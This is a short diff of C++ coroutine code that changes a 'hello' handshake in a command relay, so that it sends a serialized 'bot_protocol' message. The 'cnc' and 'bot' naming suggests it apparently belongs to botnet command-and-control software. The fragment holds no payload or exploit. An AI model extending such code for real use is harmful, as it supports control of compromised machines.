@@ -3,15 +3,9 @@
 #include "session.h"
 using namespace cnc::common;
 
-cmd_relay_send::awaitable_type<cmd_relay_send::hello_result> cmd_relay_send::hello(socket_type &socket)
+cmd_relay_send::awaitable_type<cmd_relay_send::hello_result> cmd_relay_send::hello(socket_type &socket, const bot_protocol::hello_data &msg)
 {
-	auto result = co_await hello(socket, "");
-	co_return result;
-}
-
-cmd_relay_send::awaitable_type<cmd_relay_send::hello_result> cmd_relay_send::hello(socket_type &socket, const std::string &msg)
-{
-	co_await session_type::send_msg(socket, cmd_relay_protocol::types::HELLO, msg);
+	co_await session_type::send_msg(socket, cmd_relay_protocol::types::HELLO, serialize(msg));
 	auto result = co_await recv_err_or_ok(socket);
 	co_return result;
 	co_return hello_result{false};
